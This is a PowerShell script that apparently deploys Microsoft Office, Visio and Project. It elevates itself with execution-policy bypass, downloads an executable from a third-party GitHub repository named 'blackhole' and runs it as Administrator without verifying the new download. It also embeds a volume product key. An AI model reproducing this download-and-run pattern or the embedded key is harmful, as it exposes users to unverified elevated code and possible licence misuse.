# Function to check if PowerShell is running as Administrator
function Test-Administrator {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Check if running as Administrator
if (-Not (Test-Administrator)) {
    Write-Host "This script requires administrator privileges. Re-launching as Administrator..." -ForegroundColor Yellow

    # Get the current script path
    $scriptPath = $MyInvocation.MyCommand.Path

    # Launch PowerShell as Administrator
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs

    # Exit the current non-administrative session
    exit
}

# Define variables
$folderName = "Microsoft Office 365 Deployment"
$tempDir = [System.IO.Path]::GetTempPath() # Get the system temporary directory
$directory = Join-Path -Path $tempDir -ChildPath $folderName
$odtUrl = "https://raw.githubusercontent.com/almaheras/blackhole/refs/heads/main/setup.exe"
$configFileName = "Configuration.xml"
$configPath = Join-Path -Path $directory -ChildPath $configFileName
$expectedHash = "9530c6156cf8aba25e660b94666158f34ce54c2269af4727486c34b7ac5fb159ec711c9ee98ba5fda673fd29da3204111df52445d64ca5aca077ece79364dd61" # Known SHA-512 hash

# Function to calculate the hash of a file using SHA-512
function Get-FileHashValue {
    param([string]$FilePath)
    if (Test-Path $FilePath) {
        $hash = Get-FileHash -Path $FilePath -Algorithm SHA512
        return $hash.Hash
    }
    return $null
}

# Create the directory in the temporary folder
if (!(Test-Path -Path $directory)) {
    New-Item -ItemType Directory -Path $directory
}

# Check if the ODT executable already exists and validate its hash
$odtPath = Join-Path -Path $directory -ChildPath "OfficeDeploymentTool.exe"
$shouldDownload = $true
if (Test-Path $odtPath) {
    Write-Host "File already exists in the temporary folder. Checking hash..."
    $fileHash = Get-FileHashValue -FilePath $odtPath
    if ($fileHash -eq $expectedHash) {
        Write-Host "Hash matches. Skipping download."
        $shouldDownload = $false
    } else {
        Write-Host "Hash does not match. File will be downloaded again."
    }
}

# Download the Office Deployment Tool if necessary
if ($shouldDownload) {
    Write-Host "Downloading Office Deployment Tool to the temporary folder..."
    try {
        Invoke-WebRequest -Uri $odtUrl -OutFile $odtPath -ErrorAction Stop
        Write-Host "Office Deployment Tool downloaded successfully."
    } catch {
        Write-Host "Error downloading the Office Deployment Tool. Please check the URL or your internet connection." -ForegroundColor Red
        exit
    }
}

# Validate the executable
if (-Not (Test-Path $odtPath) -or (Get-Item $odtPath).Extension -ne ".exe") {
    Write-Host "Error: Invalid or missing executable file in the temporary folder." -ForegroundColor Red
    exit
}

# Create the configuration file
Write-Host "Creating the configuration file in the temporary folder..."
$configContent = @"
<Configuration ID="bb0cf90b-e9b1-4351-90ac-e3a71d34f0b3">
  <Info Description="All licensed products under this subscription account are centrally managed and maintained by Almahera. Users are advised to utilize these services responsibly, adhering to the organization's guidelines and ensuring compliance with all applicable usage policies." />
  <Add OfficeClientEdition="64" Channel="CurrentPreview">
    <Product ID="O365ProPlusRetail">
      <Language ID="id-id" />
      <Language ID="MatchOS" />
      <Language ID="en-us" />
      <ExcludeApp ID="Groove" />
      <ExcludeApp ID="Lync" />
      <ExcludeApp ID="OutlookForWindows" />
    </Product>
    <Product ID="VisioProRetail">
      <Language ID="id-id" />
      <Language ID="MatchOS" />
      <Language ID="en-us" />
      <ExcludeApp ID="Groove" />
      <ExcludeApp ID="Lync" />
      <ExcludeApp ID="OutlookForWindows" />
    </Product>
    <Product ID="ProjectPro2024Volume" PIDKEY="FQQ23-N4YCY-73HQ3-FM9WC-76HF4">
      <Language ID="id-id" />
      <Language ID="MatchOS" />
      <Language ID="en-us" />
      <ExcludeApp ID="Groove" />
      <ExcludeApp ID="Lync" />
      <ExcludeApp ID="OutlookForWindows" />
    </Product>
    <Product ID="AccessRuntimeRetail">
      <Language ID="id-id" />
      <Language ID="MatchOS" />
      <Language ID="en-us" />
    </Product>
    <Product ID="ProofingTools">
      <Language ID="en-us" />
      <Language ID="id-id" />
    </Product>
  </Add>
  <Property Name="SharedComputerLicensing" Value="0" />
  <Property Name="FORCEAPPSHUTDOWN" Value="TRUE" />
  <Property Name="DeviceBasedLicensing" Value="0" />
  <Property Name="SCLCacheOverride" Value="0" />
  <Property Name="TenantId" Value="bd03d74d-3de5-4fd3-9815-1f25618f5186" />
  <Property Name="AUTOACTIVATE" Value="1" />
  <Updates Enabled="TRUE" />
  <AppSettings>
    <Setup Name="Company" Value="Almahera" />
  </AppSettings>
  <Display Level="Full" AcceptEULA="TRUE" />
</Configuration>
"@
$configContent | Out-File -FilePath $configPath -Encoding UTF8
Write-Host "Configuration file created successfully in the temporary folder."

# Run the tool
Write-Host "Running the Office Deployment Tool from the temporary folder to begin installation..."
try {
    Start-Process -FilePath $odtPath -ArgumentList "/configure $configPath" -Wait
    Write-Host "Office installation process initiated."
} catch {
    Write-Host "Error running the Office Deployment Tool executable from the temporary folder." -ForegroundColor Red
}

# Clean up downloaded files and folder after installation
Write-Host "Cleaning up temporary files..."
try {
    Remove-Item -Path $directory -Recurse -Force
    Write-Host "Temporary files cleaned up successfully."
} catch {
    Write-Host "Error cleaning up temporary files." -ForegroundColor Red
}